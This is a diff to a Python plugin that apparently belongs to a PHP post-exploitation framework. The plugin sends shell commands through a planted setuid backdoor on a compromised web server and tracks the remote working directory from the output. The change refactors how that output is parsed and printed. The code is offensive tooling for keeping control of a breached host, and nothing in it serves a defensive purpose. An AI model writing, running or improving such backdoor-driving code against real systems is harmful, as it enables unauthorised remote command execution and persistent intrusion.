@@ -115,7 +115,7 @@ command = 'cd ' + environ['SUIDROOT_PWD'] + command
 # token to make sure new pwd is known
 if not command.endswith(";"):
     command += " ; "
-command += 'echo -e "\\nsuid" `pwd` suid' 
+command += 'echo suid `pwd` suid' 
 
 # build the payload to send the command to run on system
 payload = server.payload.Payload("payload.php")
@@ -123,16 +123,15 @@ payload = server.payload.Payload("payload.php")
 payload['BACKDOOR'] = "/////////" + environ['SUIDROOT_BACKDOOR']
 payload['COMMAND'] = repr(command)
 
-print("[#] raw command: %r" %command)
+print("[#] raw command: %r" % command)
 
 output = payload.send()
-
 lines = output.splitlines()
+
 if not lines:
     sys.exit("No output received")
 
-new_pwd = lines[-1]
-response = "\n".join(lines[:-1])
+new_pwd = lines.pop()
 
 try:
     assert new_pwd.startswith("suid ")
@@ -140,10 +139,10 @@ try:
     new_pwd = new_pwd[5:-5]
     assert server.path.isabs(new_pwd)
     environ['SUIDROOT_PWD'] = new_pwd
+    for line in lines:
+        print(line)
 except AssertionError:
     print("[-] Couldn't retrieve new $PWD.")
     print("[-] Raw output:")
     print(output)
-
-# finaly, print the command response
-print(response)
+    sys.exit(1)
